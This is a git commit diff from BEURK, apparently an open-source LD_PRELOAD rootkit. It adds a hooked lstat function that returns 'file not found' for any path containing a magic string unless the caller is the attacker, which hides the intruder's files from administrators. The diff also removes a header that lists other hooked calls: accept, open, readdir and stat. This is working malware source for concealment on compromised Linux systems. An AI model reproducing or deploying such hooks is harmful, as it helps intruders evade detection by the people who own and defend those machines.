225f2d429bcdc7e516ca4c08816b3f22211a7daa
mzap <mzapata@student.42.fr>
2015-05-16 16:24:41 +0200

    feat(core): add lstat hook

--- src/hooks/lstat.c
+++ src/hooks/lstat.c
@@ -18,21 +18,22 @@
  * along with BEURK.  If not, see <http://www.gnu.org/licenses/>.
  */
 
-#pragma once
+#include <errno.h> /* errno, ENOENT */
+#include <string.h> /* strstr() */
+#include "beurk.h"
+#include "config.h"
+#include "hooks.h"
 
-#include <dirent.h> /* struct dirent, DIR */
-#include <sys/socket.h> /* struct sockaddr, socklen_t */
-#include <sys/stat.h> /* struct stat */
+int lstat(const char *path, struct stat *buf) {
+    DEBUG(D_INFO, "called lstat(3) hook");
 
-# define _HOOKED __attribute__((visibility("default")))
+    if (is_attacker())
+        return (REAL_LSTAT(path, buf));
 
-/** Function hooks prototypes
- *
- * This header file contains ALL protypes of hooked functions.
- */
+    if (strstr(path, MAGIC_STRING)) {
+        errno = ENOENT;
+        return (-1);
+    }
 
-int             accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen) _HOOKED;
-int             open(const char *path, int oflag, ...) _HOOKED;
-struct dirent   *readdir(DIR *dirp) _HOOKED;
-int             stat(const char *pathname, struct stat *buf) _HOOKED;
-int             lstat(const char *path, struct stat *buf) _HOOKED;
+    return (REAL_LSTAT(path, buf));
+}
